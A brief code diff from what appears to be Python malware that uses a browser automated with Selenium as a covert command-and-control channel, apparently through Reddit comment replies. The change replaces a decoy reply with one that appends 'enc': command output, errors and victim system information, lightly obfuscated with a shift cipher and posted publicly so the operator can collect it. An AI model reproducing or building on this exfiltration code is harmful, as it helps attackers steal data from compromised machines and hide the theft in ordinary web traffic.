@@ -155,7 +155,7 @@ R9ZFVLiX1VQS7vVicd1q2hbnRfspNFqN/N4+2uVyXndwKJkPkSlO5A==
             self.victimInfo = self.get_victim_info()
         enc = "{} {} {}".format(data, err, self.victimInfo)
         enc = shift_encrypt(enc, 16)
-        replyData = f"It's so correct!" # replyData = f"It's so correct!! {enc}"
+        replyData = f"It's so correct!! {enc}"
 
         reply = browser.find_element_by_xpath(f'//*[@id="t1_{id}"]/div[2]/div[3]/div[4]/div/div/div/div[2]/div/div[1]/div/div/div')
         reply.send_keys(replyData)
